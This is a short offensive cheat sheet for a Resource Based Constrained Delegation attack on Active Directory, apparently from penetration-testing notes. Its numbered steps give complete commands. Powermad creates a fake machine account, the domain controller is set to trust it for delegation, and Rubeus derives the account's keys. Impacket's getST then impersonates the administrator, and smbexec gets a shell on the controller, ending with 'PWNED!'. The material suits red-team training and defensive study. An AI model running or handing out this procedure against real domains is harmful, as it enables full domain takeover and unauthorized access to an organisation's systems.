## Resource Based Constrained Delegation (RBCD)

## TOOLS: Bloodhound, Powermad, Powerview, Kekeo, Impacket, AD powershell module

### Requirements: Your current user belongs to a group that has write access/generic all privileges on the DC.

### STEPS:

#### 1) Transfer rubeus and powermad on target machine

#### 2) Import-Module ./powermad.ps1 (Import powermad)

#### 3) Import-Module ActiveDirectory

#### 4) Set-Variable -Name "PwnPC" -Value "PWN01"

#### Set-Variable -Name "targetComputer" -Value "DC" (Set variables)

#### 5) New-MachineAccount -MachineAccount (Get-Variable -Name "PwnPC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose ( With powermad, add the new fake computer object to AD)

#### 6) Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "PwnPC").Value + '$') (With built-in AD modules, give the new fake computer object the Constrained Delegation privilege)

#### 7) Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount (With built-in AD modules, check that the last command worked)

#### 8) .\rubeus.exe hash /password:123456 /user:PWN01$ /domain:DOMAIN.LOCAL (With Rubeus, generate the new fake computer object password hashes.)

#### 9) Impacket-getST DOMAIN.LOCAL/PWN01 -dc-ip DC.DOMAIN.LOCAL -impersonate administrator -spn http://DC.DOMAIN.LOCAL -aesKey GENERATED_AESKEY (Using the getST impacket module, generate a ccached TGT and used KERB5CCNAME pass the ccache file for the requested service)

#### 10) export KRB5CCNAME=administrator.ccache (Set local variable of KERB5CCNAME to pass the ccache TGT file for the requested service)

#### 11) impacket-smbexec DOMAIN.LOCAL/administrator@DC.DOMAIN.LOCAL -no-pass -k (Use smbexec impacket module to connect with the TGT we just made to the server as the user administrator over SMB)

#### 12) PWNED!
